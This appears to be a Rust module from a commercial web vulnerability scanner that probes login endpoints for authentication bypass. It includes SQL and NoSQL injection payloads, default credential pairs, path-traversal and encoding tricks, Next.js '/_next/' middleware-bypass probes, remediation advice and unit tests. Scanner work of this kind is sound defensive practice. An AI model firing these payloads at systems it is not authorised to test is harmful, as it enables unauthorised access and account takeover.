// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Authentication Bypass Scanner
 * Tests for authentication bypass vulnerabilities
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use tracing::info;

pub struct AuthBypassScanner {
    http_client: Arc<HttpClient>,
}

impl AuthBypassScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan for authentication bypass vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("[AuthBypass] Scanning: {}", url);

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Test 1: SQL injection in auth
        tests_run += 1;
        if let Ok(response) = self.test_sql_auth_bypass(url).await {
            self.check_sql_auth_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 2: NoSQL injection in auth
        tests_run += 1;
        if let Ok(response) = self.test_nosql_auth_bypass(url).await {
            self.check_nosql_auth_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 3: Empty password bypass
        tests_run += 1;
        if let Ok(response) = self.test_empty_password(url).await {
            self.check_empty_password_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 4: Default credentials
        tests_run += 1;
        if let Ok(response) = self.test_default_credentials(url).await {
            self.check_default_credentials(&response, url, &mut vulnerabilities);
        }

        // Test 5: Authentication header manipulation
        tests_run += 1;
        if let Ok(response) = self.test_header_manipulation(url).await {
            self.check_header_manipulation(&response, url, &mut vulnerabilities);
        }

        // Test 6: Path traversal to bypass auth
        tests_run += 1;
        if let Ok(response) = self.test_path_bypass(url).await {
            self.check_path_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 7: HTTP verb tampering
        tests_run += 1;
        if let Ok(response) = self.test_verb_tampering(url).await {
            self.check_verb_tampering(&response, url, &mut vulnerabilities);
        }

        // Test 8: Unicode/encoding bypass
        tests_run += 1;
        if let Ok(response) = self.test_encoding_bypass(url).await {
            self.check_encoding_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 9: Next.js middleware bypass via /_next/ prefix
        tests_run += 1;
        let nextjs_results = self.test_nextjs_middleware_bypass(url).await;
        for (bypass_url, response, original_path) in nextjs_results {
            self.check_nextjs_middleware_bypass(&response, &bypass_url, &original_path, &mut vulnerabilities);
        }

        info!(
            "[SUCCESS] [AuthBypass] Completed {} tests, found {} issues",
            tests_run,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Test SQL injection auth bypass
    async fn test_sql_auth_bypass(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        let payloads = vec![
            "admin' OR '1'='1",
            "admin' OR '1'='1'--",
            "admin' OR '1'='1'/*",
            "' OR 1=1--",
        ];

        // Try first payload
        let test_url = if url.contains('?') {
            format!("{}&username={}&password={}", url,
                urlencoding::encode(payloads[0]),
                urlencoding::encode(payloads[0]))
        } else {
            format!("{}?username={}&password={}", url,
                urlencoding::encode(payloads[0]),
                urlencoding::encode(payloads[0]))
        };

        self.http_client.get(&test_url).await
    }

    /// Check SQL auth bypass
    fn check_sql_auth_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body_lower = response.body.to_lowercase();

        // Check for successful authentication indicators
        let auth_success = vec![
            "welcome", "dashboard", "logged in", "successful",
            "profile", "logout", "sign out", "authenticated"
        ];

        let success_count = auth_success.iter()
            .filter(|&indicator| body_lower.contains(indicator))
            .count();

        if success_count >= 2 || response.status_code == 302 {
            vulnerabilities.push(self.create_vulnerability(
                "SQL Injection Authentication Bypass",
                url,
                Severity::Critical,
                Confidence::High,
                "SQL injection allows authentication bypass - complete account takeover",
                format!("SQL injection payload bypassed authentication (status: {})", response.status_code),
                9.8,
            ));
        }
    }

    /// Test NoSQL injection auth bypass
    async fn test_nosql_auth_bypass(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        let payload = r#"{"username": {"$gt": ""}, "password": {"$gt": ""}}"#;

        let test_url = if url.contains('?') {
            format!("{}&data={}", url, urlencoding::encode(payload))
        } else {
            format!("{}?data={}", url, urlencoding::encode(payload))
        };

        self.http_client.get(&test_url).await
    }

    /// Check NoSQL auth bypass
    fn check_nosql_auth_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body_lower = response.body.to_lowercase();

        if (body_lower.contains("welcome") || body_lower.contains("dashboard"))
            && !body_lower.contains("login")
            && !body_lower.contains("password")
        {
            vulnerabilities.push(self.create_vulnerability(
                "NoSQL Injection Authentication Bypass",
                url,
                Severity::Critical,
                Confidence::Medium,
                "NoSQL injection allows authentication bypass",
                "NoSQL operator injection bypassed authentication".to_string(),
                9.3,
            ));
        }
    }

    /// Test empty password bypass
    async fn test_empty_password(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        let test_url = if url.contains('?') {
            format!("{}&username=admin&password=", url)
        } else {
            format!("{}?username=admin&password=", url)
        };

        self.http_client.get(&test_url).await
    }

    /// Check empty password bypass
    fn check_empty_password_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        if response.status_code == 200 || response.status_code == 302 {
            let body_lower = response.body.to_lowercase();

            if body_lower.contains("welcome") || body_lower.contains("dashboard") {
                vulnerabilities.push(self.create_vulnerability(
                    "Empty Password Authentication Bypass",
                    url,
                    Severity::Critical,
                    Confidence::Medium,
                    "Authentication accepts empty password - critical security flaw",
                    "Empty password allowed authentication".to_string(),
                    9.1,
                ));
            }
        }
    }

    /// Test default credentials
    async fn test_default_credentials(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        // Common default credentials
        let credentials = vec![
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("administrator", "administrator"),
        ];

        // Try first credential pair
        let (username, password) = credentials[0];
        let test_url = if url.contains('?') {
            format!("{}&username={}&password={}", url, username, password)
        } else {
            format!("{}?username={}&password={}", url, username, password)
        };

        self.http_client.get(&test_url).await
    }

    /// Check default credentials
    fn check_default_credentials(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body_lower = response.body.to_lowercase();

        if (response.status_code == 200 || response.status_code == 302)
            && (body_lower.contains("welcome") || body_lower.contains("dashboard"))
        {
            vulnerabilities.push(self.create_vulnerability(
                "Default Credentials Accepted",
                url,
                Severity::Critical,
                Confidence::Medium,
                "System accepts default credentials - immediate security risk",
                "Default credentials (admin/admin) may be accepted".to_string(),
                9.0,
            ));
        }
    }

    /// Test header manipulation
    async fn test_header_manipulation(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        // Try adding headers that might bypass auth
        // Note: Simplified version - real implementation would use custom headers
        let test_url = if url.contains('?') {
            format!("{}&X-Forwarded-For=127.0.0.1", url)
        } else {
            format!("{}?X-Forwarded-For=127.0.0.1", url)
        };

        self.http_client.get(&test_url).await
    }

    /// Check header manipulation
    fn check_header_manipulation(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        if response.status_code == 200 {
            let body_lower = response.body.to_lowercase();

            if body_lower.contains("admin") || body_lower.contains("dashboard") {
                vulnerabilities.push(self.create_vulnerability(
                    "Header Manipulation Authentication Bypass",
                    url,
                    Severity::High,
                    Confidence::Low,
                    "Authentication may be bypassable via header manipulation",
                    "Header manipulation may bypass authentication".to_string(),
                    7.5,
                ));
            }
        }
    }

    /// Test path traversal bypass
    async fn test_path_bypass(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        let bypass_paths = vec![
            "/admin/../admin",
            "/./admin",
            "/%2e/admin",
            "/admin/.",
        ];

        // Append first bypass path to URL
        let test_url = format!("{}{}", url, bypass_paths[0]);
        self.http_client.get(&test_url).await
    }

    /// Check path bypass
    fn check_path_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        if response.status_code == 200 {
            let body_lower = response.body.to_lowercase();

            if body_lower.contains("admin") || body_lower.contains("dashboard") {
                vulnerabilities.push(self.create_vulnerability(
                    "Path Traversal Authentication Bypass",
                    url,
                    Severity::High,
                    Confidence::Medium,
                    "Path traversal bypasses authentication checks",
                    "Path manipulation bypassed authentication".to_string(),
                    8.1,
                ));
            }
        }
    }

    /// Test HTTP verb tampering
    async fn test_verb_tampering(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        // Note: Using GET for now - real implementation would test HEAD, OPTIONS, etc.
        self.http_client.get(url).await
    }

    /// Check verb tampering
    fn check_verb_tampering(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        // Check if response suggests auth bypass via different HTTP verb
        if response.status_code == 200 {
            let body_lower = response.body.to_lowercase();

            if body_lower.contains("method not allowed") == false
                && (body_lower.contains("admin") || body_lower.contains("protected"))
            {
                vulnerabilities.push(self.create_vulnerability(
                    "HTTP Verb Tampering Bypass",
                    url,
                    Severity::Medium,
                    Confidence::Low,
                    "Different HTTP verbs may bypass authentication",
                    "HTTP verb tampering may bypass authentication".to_string(),
                    6.5,
                ));
            }
        }
    }

    /// Test encoding bypass
    async fn test_encoding_bypass(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        // URL encoding variations
        let encoded_admin = vec![
            "%61dmin",      // URL encoding
            "admin%00",     // Null byte
            "admin%20",     // Space
        ];

        let test_url = if url.contains('?') {
            format!("{}&username={}", url, encoded_admin[0])
        } else {
            format!("{}?username={}", url, encoded_admin[0])
        };

        self.http_client.get(&test_url).await
    }

    /// Check encoding bypass
    fn check_encoding_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        if response.status_code == 200 {
            let body_lower = response.body.to_lowercase();

            if body_lower.contains("welcome") || body_lower.contains("authenticated") {
                vulnerabilities.push(self.create_vulnerability(
                    "Encoding-Based Authentication Bypass",
                    url,
                    Severity::High,
                    Confidence::Low,
                    "URL encoding may bypass authentication filters",
                    "Encoding manipulation may bypass authentication".to_string(),
                    7.0,
                ));
            }
        }
    }

    /// Test Next.js middleware bypass via /_next/ prefix
    /// This exploits a known issue where Next.js middleware can be bypassed
    /// by prefixing protected paths with /_next/
    /// Example: /dashboard (protected) -> /_next/dashboard (bypassed)
    /// Example: /kirjaudu (protected) -> /_next/kirjaudu (bypassed)
    async fn test_nextjs_middleware_bypass(&self, url: &str) -> Vec<(String, crate::http_client::HttpResponse, String)> {
        let mut results = Vec::new();

        // Parse the URL to extract base and path
        let parsed = match url::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return results,
        };

        let base_url = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));
        let current_path = parsed.path();

        // DYNAMIC: Start with the actual path the user provided
        let mut paths_to_test: Vec<String> = Vec::new();

        // Always test the path from the URL first (most important)
        if !current_path.is_empty() && current_path != "/" {
            paths_to_test.push(current_path.to_string());
        }

        // Next.js bypass prefixes - all known bypass vectors
        let bypass_prefixes = vec![
            "/_next",
            "/_next/static",
            "/_next/image",
            "/_next/data",
            "/_next/static/chunks",
            "/_next/static/css",
            "/_next/static/media",
        ];

        // Test the provided path first with all bypass prefixes
        for path in &paths_to_test {
            // First check if original path requires auth
            let original_url = format!("{}{}", base_url, path);

            let original_response = match self.http_client.get(&original_url).await {
                Ok(r) => r,
                Err(_) => continue,
            };

            // If original returns 401/403/302 (protected), try bypass
            let is_protected = original_response.status_code == 401
                || original_response.status_code == 403
                || original_response.status_code == 302
                || original_response.status_code == 307;

            if !is_protected {
                continue;
            }

            // Try all bypass prefixes
            for prefix in &bypass_prefixes {
                let bypass_url = format!("{}{}{}", base_url, prefix, path);

                match self.http_client.get(&bypass_url).await {
                    Ok(response) => {
                        // Bypass successful if we get 200 where we got 401/403/302 before
                        if response.status_code == 200 {
                            results.push((bypass_url, response, path.to_string()));
                            break;
                        }
                    }
                    Err(_) => continue,
                }
            }
        }

        // Also discover and test links from the page
        if let Ok(page_response) = self.http_client.get(url).await {
            let discovered_paths = self.extract_paths_from_html(&page_response.body);

            for path in discovered_paths {
                // Skip already tested paths
                if paths_to_test.contains(&path) {
                    continue;
                }

                // Skip static assets
                if path.contains(".js") || path.contains(".css") || path.contains(".png")
                   || path.contains(".jpg") || path.contains(".svg") || path.contains(".ico") {
                    continue;
                }

                let original_url = format!("{}{}", base_url, path);

                let original_response = match self.http_client.get(&original_url).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                let is_protected = original_response.status_code == 401
                    || original_response.status_code == 403
                    || original_response.status_code == 302
                    || original_response.status_code == 307;

                if !is_protected {
                    continue;
                }

                for prefix in &bypass_prefixes {
                    let bypass_url = format!("{}{}{}", base_url, prefix, path);

                    match self.http_client.get(&bypass_url).await {
                        Ok(response) => {
                            if response.status_code == 200 {
                                results.push((bypass_url, response, path.to_string()));
                                break;
                            }
                        }
                        Err(_) => continue,
                    }
                }
            }
        }

        results
    }

    /// Extract paths from HTML content for dynamic testing
    fn extract_paths_from_html(&self, html: &str) -> Vec<String> {
        let mut paths = Vec::new();

        // Extract href paths
        let href_re = regex::Regex::new(r#"href=["'](/[^"']*?)["']"#).ok();
        if let Some(re) = href_re {
            for caps in re.captures_iter(html) {
                if let Some(path) = caps.get(1) {
                    let p = path.as_str().to_string();
                    if !paths.contains(&p) {
                        paths.push(p);
                    }
                }
            }
        }

        // Extract action paths from forms
        let action_re = regex::Regex::new(r#"action=["'](/[^"']*?)["']"#).ok();
        if let Some(re) = action_re {
            for caps in re.captures_iter(html) {
                if let Some(path) = caps.get(1) {
                    let p = path.as_str().to_string();
                    if !paths.contains(&p) {
                        paths.push(p);
                    }
                }
            }
        }

        // Extract Next.js Link paths (common in Next.js apps)
        let next_link_re = regex::Regex::new(r#"<Link[^>]*href=["'](/[^"']*?)["']"#).ok();
        if let Some(re) = next_link_re {
            for caps in re.captures_iter(html) {
                if let Some(path) = caps.get(1) {
                    let p = path.as_str().to_string();
                    if !paths.contains(&p) {
                        paths.push(p);
                    }
                }
            }
        }

        paths
    }

    /// Check Next.js middleware bypass results
    fn check_nextjs_middleware_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        bypass_url: &str,
        original_path: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body_lower = response.body.to_lowercase();

        // Look for indicators that we actually got protected content
        let content_indicators = vec![
            "dashboard", "admin", "profile", "settings", "account",
            "user", "manage", "internal", "private", "panel",
            "api", "data", "config", "json", // API responses
        ];

        let has_protected_content = content_indicators.iter()
            .any(|&indicator| body_lower.contains(indicator));

        // Also check for HTML content (not just error pages or blank)
        let has_real_content = body_lower.contains("<html") ||
                               body_lower.contains("<div") ||
                               body_lower.contains("{\"") || // JSON
                               response.body.len() > 500;

        if has_protected_content && has_real_content {
            vulnerabilities.push(Vulnerability {
                id: format!("authbypass_{}", uuid::Uuid::new_v4().to_string()),
                vuln_type: "Authentication Bypass - Next.js Middleware Bypass".to_string(),
                severity: Severity::Critical,
                confidence: Confidence::High,
                category: "Authentication".to_string(),
                url: bypass_url.to_string(),
                parameter: None,
                payload: format!("/_next{}", original_path),
                description: format!(
                    "Next.js middleware bypass detected! The protected path '{}' can be accessed by \
                    prefixing it with '/_next/'. This is a known vulnerability where Next.js middleware \
                    authentication checks can be bypassed, allowing unauthenticated access to protected routes.",
                    original_path
                ),
                evidence: Some(format!(
                    "Original path '{}' was protected, but '{}' returns HTTP 200 with content",
                    original_path, bypass_url
                )),
                cwe: "CWE-287".to_string(), // Improper Authentication
                cvss: 9.1,
                verified: true,
                false_positive: false,
                remediation: r#"IMMEDIATE ACTION REQUIRED:

1. **Update Next.js to Latest Version**
   This vulnerability affects certain versions of Next.js middleware.
   Update to the latest patched version immediately.

2. **Add Explicit Path Matching in Middleware**
   ```typescript
   // middleware.ts
   import { NextResponse } from 'next/server';
   import type { NextRequest } from 'next/server';

   export function middleware(request: NextRequest) {
     const pathname = request.nextUrl.pathname;

     // CRITICAL: Check the ACTUAL path, not just pattern matching
     // Normalize the path to prevent /_next/ prefix bypass
     const normalizedPath = pathname.replace(/^\/_next/, '');

     // Define protected paths
     const protectedPaths = ['/admin', '/dashboard', '/api/admin'];

     // Check if accessing protected path (with or without /_next/ prefix)
     const isProtectedPath = protectedPaths.some(path =>
       normalizedPath.startsWith(path) || pathname.startsWith(path)
     );

     if (isProtectedPath) {
       const token = request.cookies.get('auth-token');
       if (!token) {
         return NextResponse.redirect(new URL('/login', request.url));
       }
     }

     return NextResponse.next();
   }

   // IMPORTANT: Configure matcher to include /_next paths
   export const config = {
     matcher: [
       '/((?!_next/static|_next/image|favicon.ico).*)',
       '/admin/:path*',
       '/dashboard/:path*',
       '/_next/admin/:path*',    // Also protect /_next/admin
       '/_next/dashboard/:path*', // Also protect /_next/dashboard
     ],
   };
   ```

3. **Implement Server-Side Authentication Check**
   Don't rely solely on middleware - add server-side checks:
   ```typescript
   // app/admin/page.tsx
   import { redirect } from 'next/navigation';
   import { getServerSession } from 'next-auth';

   export default async function AdminPage() {
     const session = await getServerSession();

     if (!session) {
       redirect('/login');
     }

     // Render protected content
     return <AdminDashboard />;
   }
   ```

4. **Add Route Handler Protection**
   ```typescript
   // app/api/admin/route.ts
   import { NextResponse } from 'next/server';
   import { getServerSession } from 'next-auth';

   export async function GET() {
     const session = await getServerSession();

     if (!session) {
       return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
     }

     // Return protected data
   }
   ```

5. **Block /_next Prefix for Protected Paths at CDN/WAF Level**
   In Cloudflare or nginx, block requests that try to access protected
   paths via /_next prefix:
   ```nginx
   location ~* ^/_next/(admin|dashboard|api/admin) {
     return 403;
   }
   ```

References:
- Next.js Security: https://nextjs.org/docs/app/building-your-application/configuring/middleware
- CVE-2024-34351: https://nvd.nist.gov/vuln/detail/CVE-2024-34351
"#.to_string(),
                discovered_at: chrono::Utc::now().to_rfc3339(),
            });
        }
    }

    /// Create vulnerability record
    fn create_vulnerability(
        &self,
        title: &str,
        url: &str,
        severity: Severity,
        confidence: Confidence,
        description: &str,
        evidence: String,
        cvss: f32,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("authbypass_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: format!("Authentication Bypass - {}", title),
            severity,
            confidence,
            category: "Authentication".to_string(),
            url: url.to_string(),
            parameter: None,
            payload: String::new(),
            description: description.to_string(),
            evidence: Some(evidence),
            cwe: "CWE-287".to_string(), // Improper Authentication
            cvss,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED:

1. **Implement Parameterized Queries (SQL Injection Prevention)**
   ```python
   # WRONG - Vulnerable to SQL injection
   query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

   # CORRECT - Use parameterized queries
   query = "SELECT * FROM users WHERE username=%s AND password=%s"
   cursor.execute(query, (username, hashed_password))
   ```

2. **Use Proper Password Hashing**
   ```javascript
   // Node.js with bcrypt
   const bcrypt = require('bcrypt');

   // Hash password on registration
   const saltRounds = 12;
   const hashedPassword = await bcrypt.hash(password, saltRounds);

   // Verify on login
   const match = await bcrypt.compare(password, storedHash);
   if (!match) {
       throw new Error('Invalid credentials');
   }
   ```

3. **Validate Empty/Null Values**
   ```java
   // Java authentication
   public boolean authenticate(String username, String password) {
       // Reject empty credentials
       if (username == null || username.trim().isEmpty() ||
           password == null || password.trim().isEmpty()) {
           return false;
       }

       // Continue with authentication
       return validateCredentials(username, password);
   }
   ```

4. **Disable Default Credentials**
   ```python
   # Force password change on first login
   if user.is_default_password:
       raise AuthenticationError("Please change default password")

   # Check against common password list
   if password in COMMON_PASSWORDS:
       raise ValidationError("Password too common")
   ```

5. **Implement Proper Header Validation**
   ```javascript
   // Don't trust headers for authentication
   app.use((req, res, next) => {
       // WRONG - Trusting X-Forwarded-For for auth
       if (req.headers['x-forwarded-for'] === '127.0.0.1') {
           req.user = 'admin';  // NEVER DO THIS
       }

       // CORRECT - Only use headers for logging/rate limiting
       const clientIP = req.headers['x-forwarded-for'] || req.ip;
       log.info(`Request from ${clientIP}`);
       next();
   });
   ```

6. **Normalize URLs/Paths**
   ```go
   // Go path normalization
   import "path/filepath"

   func authorizeRequest(requestPath string) bool {
       // Normalize path to prevent traversal
       normalized := filepath.Clean(requestPath)

       // Check if starts with allowed prefix
       if !strings.HasPrefix(normalized, "/api/public/") {
           return requireAuthentication()
       }
       return true
   }
   ```

7. **Restrict HTTP Methods Properly**
   ```javascript
   // Express.js method restriction
   app.route('/admin')
       .get(requireAuth, handleGet)
       .post(requireAuth, handlePost)
       .all((req, res) => {
           // Reject all other methods
           res.status(405).send('Method Not Allowed');
       });
   ```

8. **Sanitize and Validate All Inputs**
   ```python
   import re

   def validate_username(username):
       # Allow only alphanumeric and underscore
       if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
           raise ValidationError("Invalid username format")
       return username

   def authenticate(username, password):
       username = validate_username(username)
       # Continue with authentication
   ```

9. **Implement Rate Limiting**
   ```javascript
   const rateLimit = require('express-rate-limit');

   const authLimiter = rateLimit({
       windowMs: 15 * 60 * 1000,  // 15 minutes
       max: 5,  // 5 attempts
       message: 'Too many login attempts, please try again later',
       standardHeaders: true,
       legacyHeaders: false,
   });

   app.post('/login', authLimiter, handleLogin);
   ```

10. **Use MFA (Multi-Factor Authentication)**
    ```javascript
    async function authenticate(username, password, totpCode) {
        // Verify password
        const user = await verifyPassword(username, password);
        if (!user) return false;

        // Verify TOTP
        const speakeasy = require('speakeasy');
        const verified = speakeasy.totp.verify({
            secret: user.totpSecret,
            encoding: 'base32',
            token: totpCode,
            window: 1
        });

        return verified;
    }
    ```

11. **Security Checklist**
    - [ ] All queries use parameterized statements
    - [ ] Passwords hashed with bcrypt/Argon2
    - [ ] Empty/null credentials rejected
    - [ ] Default credentials disabled/changed
    - [ ] Headers not used for authorization
    - [ ] URL paths normalized
    - [ ] HTTP methods explicitly whitelisted
    - [ ] All inputs validated and sanitized
    - [ ] Rate limiting on auth endpoints (5-10 attempts/15min)
    - [ ] MFA enabled for privileged accounts
    - [ ] Account lockout after failed attempts
    - [ ] Comprehensive logging enabled

12. **Monitoring & Alerting**
    - Log all authentication attempts
    - Alert on multiple failed logins
    - Monitor for SQL injection patterns
    - Track unusual authentication patterns
    - Implement anomaly detection

References:
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP Password Storage: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- CWE-287: https://cwe.mitre.org/data/definitions/287.html
"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn test_sql_injection_detection() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: "Welcome to your dashboard, admin! You are logged in.".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_sql_auth_bypass(&response, "https://example.com/login", &mut vulns);

        assert!(vulns.len() > 0, "Should detect SQL injection auth bypass");
        assert_eq!(vulns[0].severity, Severity::Critical);
    }

    #[test]
    fn test_empty_password_detection() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: "Welcome to the dashboard".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_empty_password_bypass(&response, "https://example.com/login", &mut vulns);

        assert_eq!(vulns.len(), 1, "Should detect empty password bypass");
        assert_eq!(vulns[0].severity, Severity::Critical);
    }

    #[test]
    fn test_no_false_positive() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 401,
            body: "Invalid credentials".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_sql_auth_bypass(&response, "https://example.com/login", &mut vulns);

        assert_eq!(vulns.len(), 0, "Should not report false positive");
    }

    #[test]
    fn test_redirect_detection() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 302,
            body: String::new(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_sql_auth_bypass(&response, "https://example.com/login", &mut vulns);

        assert!(vulns.len() > 0, "Should detect bypass via redirect");
    }

    #[test]
    fn test_default_credentials_detection() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: "Welcome admin!".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_default_credentials(&response, "https://example.com/login", &mut vulns);

        assert_eq!(vulns.len(), 1, "Should detect default credentials");
        assert_eq!(vulns[0].severity, Severity::Critical);
    }
}
